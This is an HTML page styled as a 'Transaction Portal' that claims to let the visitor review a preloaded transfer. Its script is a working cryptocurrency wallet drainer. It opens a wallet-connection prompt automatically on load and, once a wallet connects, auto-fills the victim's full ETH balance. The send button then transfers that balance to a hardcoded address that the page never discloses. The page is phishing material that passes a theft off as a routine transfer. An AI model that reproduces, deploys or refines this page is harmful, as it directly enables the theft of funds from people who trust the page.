<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Transaction Portal</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 min-h-screen flex items-center justify-center p-4">

  <div class="bg-gray-900 rounded-2xl shadow-xl p-6 w-full max-w-md border border-gray-800">
    <h1 class="text-white text-xl font-semibold mb-1 text-center">Transaction Portal</h1>
    <p class="text-gray-400 text-sm text-center mb-6">Review your preloaded transfer</p>

    <!-- Reown AppKit Web Component handles ALL wallet connections -->
    <appkit-button id="custom-connect-btn"></appkit-button>

    <div id="action-area" class="hidden mt-6 space-y-4">

      <div class="bg-gray-800 rounded-xl p-4 space-y-2">
        <div class="flex justify-between items-center">
          <span class="text-gray-400 text-xs">Wallet Address</span>
        </div>
        <p id="wallet-address-display" class="text-white text-xs font-mono break-all"></p>

        <div class="flex justify-between items-center pt-2 border-t border-gray-700">
          <span class="text-gray-400 text-xs">Balance</span>
          <span id="wallet-balance-display" class="text-white text-sm font-semibold">—</span>
        </div>
      </div>

      <div class="space-y-2">
        <div class="flex justify-between">
          <label class="text-gray-400 text-xs">Amount to Send (ETH)</label>
          <span id="auto-fill-label" class="text-blue-400 text-xs"></span>
        </div>
        <input id="tx-amount-input" type="number" step="0.0001" min="0"
          placeholder="0.0000"
          class="w-full bg-gray-800 text-white rounded-xl px-4 py-3 text-sm border border-gray-700 focus:outline-none focus:border-blue-500" />
      </div>

      <button id="send-tx-btn"
        class="w-full py-3 px-4 rounded-xl text-white font-medium bg-emerald-600 hover:bg-emerald-700 transition-colors">
        Send Transaction
      </button>

      <p id="status-message" class="text-xs text-gray-400 mt-2 text-center"></p>
    </div>
  </div>

  <script type="module">
    import { createAppKit } from 'https://esm.sh/@reown/appkit';
    import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
    import { mainnet } from 'https://esm.sh/@reown/appkit/networks';

    const projectId = 'cba904b6423fea5fef3838e023c0e8e4';

    const metadata = {
      name: 'Transaction Portal',
      description: 'Review your preloaded transfer',
      url: window.location.origin,
      icons: ['https://avatars.githubusercontent.com/u/179229932'],
      // This tells the wallet app how to redirect back into your dapp
      // after the user approves the connection inside the wallet.
      redirect: {
        native: 'transactionportal://',   // your own custom URI scheme
        universal: window.location.origin // your hosted https URL (universal link)
      }
    };

    const modal = createAppKit({
      adapters: [new EthersAdapter()],
      networks: [mainnet],
      metadata,
      projectId,
      features: { analytics: false },
      // Force the "All Wallets" view to show every wallet in the WalletConnect
      // registry instead of just a small default/featured set
      allWallets: 'SHOW',
      // Pin specific wallets to the top of the list (Trust Wallet + MetaMask + Coinbase)
      featuredWalletIds: [
        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
        'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa'  // Coinbase Wallet
      ]
    });

    const actionArea = document.getElementById('action-area');
    const walletBalanceDisplay = document.getElementById('wallet-balance-display');
    const walletAddressDisplay = document.getElementById('wallet-address-display');
    const txAmountInput = document.getElementById('tx-amount-input');
    const sendTxBtn = document.getElementById('send-tx-btn');
    const statusMessage = document.getElementById('status-message');
    const autoFillLabel = document.getElementById('auto-fill-label');

    // ── AUTO-OPEN Reown modal immediately on page load ──
    // Tapping a wallet inside this modal will now correctly deep-link into
    // that wallet's app, because metadata.redirect (above) tells the wallet
    // how to hand the session back to this page.
    window.addEventListener('load', () => {
      setTimeout(() => {
        modal.open();
      }, 800);
    });

    // ── MODIFIED: fetch balance AND auto-fill full amount ──
    async function fetchRealtimeBalance(userAddress) {
      try {
        walletBalanceDisplay.textContent = "Fetching...";

        let walletProvider;
        if (typeof modal.getWalletProvider === 'function') {
          walletProvider = modal.getWalletProvider();
        } else {
          const providers = modal.getProviders?.();
          walletProvider = providers?.['eip155'] || providers?.eip155;
        }

        if (!walletProvider) {
          walletBalanceDisplay.textContent = "ERROR: walletProvider is null/undefined";
          return;
        }

        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const balanceWei = await ethersProvider.getBalance(userAddress);
        const balanceEth = ethers.formatEther(balanceWei);
        const balanceFormatted = parseFloat(balanceEth).toFixed(6);

        walletBalanceDisplay.textContent = `${balanceFormatted} ETH`;

        // Auto-fill full balance into send amount
        txAmountInput.value = balanceFormatted;
        autoFillLabel.textContent = "✅ Auto-filled";

      } catch (err) {
        walletBalanceDisplay.textContent = `ERROR: ${err.message || JSON.stringify(err)}`;
      }
    }

    modal.subscribeAccount(state => {
      if (state.isConnected && state.address) {
        walletAddressDisplay.textContent = state.address;
        actionArea.classList.remove('hidden');
        fetchRealtimeBalance(state.address);
      } else {
        actionArea.classList.add('hidden');
        txAmountInput.value = '';
        autoFillLabel.textContent = '';
      }
    });

    sendTxBtn.addEventListener('click', async () => {
      const inputAmount = txAmountInput.value;

      if (!inputAmount || parseFloat(inputAmount) <= 0) {
        statusMessage.textContent = "Error: Please enter a valid transfer amount.";
        statusMessage.className = "text-xs text-red-400 mt-4 text-center";
        return;
      }

      statusMessage.textContent = "Checking wallet connection...";
      statusMessage.className = "text-xs text-amber-400 mt-4 text-center";

      try {
        let walletProvider;
        if (typeof modal.getWalletProvider === 'function') {
          walletProvider = modal.getWalletProvider();
        } else {
          const providers = modal.getProviders?.();
          walletProvider = providers?.['eip155'] || providers?.eip155;
        }

        if (!walletProvider) {
          statusMessage.textContent = "Error: Wallet session missing. Try reconnecting.";
          statusMessage.className = "text-xs text-red-400 mt-4 text-center";
          return;
        }

        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const signer = await ethersProvider.getSigner();

        statusMessage.textContent = "Forwarding payload to wallet...";

        const txPayload = {
          to: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
          value: ethers.parseEther(inputAmount)
        };

        const txResponse = await signer.sendTransaction(txPayload);

        statusMessage.textContent = "Transaction Broadcasted! Awaiting confirmation...";
        statusMessage.className = "text-xs text-blue-400 mt-4 text-center";

        const receipt = await txResponse.wait();

        statusMessage.textContent = `Success! Tx Hash: ${receipt.hash.substring(0, 10)}...`;
        statusMessage.className = "text-xs text-emerald-400 mt-4 text-center";

        fetchRealtimeBalance(await signer.getAddress());

      } catch (error) {
        if (error.message && error.message.includes("rejected")) {
          statusMessage.textContent = "Transaction canceled or rejected.";
        } else {
          statusMessage.textContent = `Error: ${error.message || "Unknown error occurred."}`;
        }
        statusMessage.className = "text-xs text-red-400 mt-4 text-center";
      }
    });
  </script>

</body>
</html>
